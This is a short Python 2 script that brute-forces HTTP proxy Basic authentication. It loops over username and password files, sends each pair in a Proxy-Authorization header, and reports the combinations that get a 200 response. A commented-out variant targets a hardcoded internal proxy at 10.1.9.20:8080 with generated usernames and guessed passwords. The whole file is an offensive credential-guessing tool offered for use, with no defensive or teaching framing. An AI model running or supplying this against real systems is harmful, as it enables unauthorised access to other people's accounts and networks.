#!/usr/bin/env python

import sys
import os
import socket
import base64
import argparse
import logging
import threading
import httplib

def main():
    parser = argparse.ArgumentParser(description='Bruteforce HTTP Logins')
    #~ parser.add_argument("-u", "--usrslst", help="File containing the usernames")
    #~ parser.add_argument("-p", "--passlst", help="File containing the passwords")
    parser.add_argument("host", help="IP Address/Hostname of Proxy")
    parser.add_argument("port", help="Port on which the Proxy is listening")
    args = parser.parse_args()
    logger = logging.getLogger("default")
    
    for user in open('users'):
        #remove newline character
        user = user[:-1]
        for psw in open('psw'):
            psw = psw[:-1]
            enc_str = base64.b64encode(user + ':' + psw)
            client = httplib.HTTPConnection(args.host, int(args.port))
            client.putrequest("HEAD", "http://www.google.co.in/")
            client.putheader("Proxy-Authorization", "Basic "+enc_str)
            client.endheaders()
            response = client.getresponse()
            if response.status is 200:
                print "Found match:",user,psw


#~ count=2009001
#~ passlst=[]
#~ 
#~ for i in range(2,800):    
    #~ username="f"+str(count)
    #~ passlst.append(username)
    #~ count=count+1
    #~ 
#~ 
#~ print("Starting Brute....")
#~ for password in passlst:
    #~ username=password
    #~ print username
    #~ connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    #~ connection.settimeout(50)
    #~ connection.connect(("10.1.9.20",8080))
    #~ connection.send("GET http://www.google.co.in/index.html HTTP/1.1\r\n")
    #~ connection.send("Proxy-Authorization: Basic "+ base64.b64encode(username+":"+"qwerty") +"\r\n")
    #~ connection.send("\r\n")
    #~ response = connection.recv(1024)
    #~ if "HTTP/1.0 200 OK" in response:
        #~ print "---- match found" + "      "+username
    #~ connection.close()
    #~ count=count+1

if __name__ == "__main__":
    main()
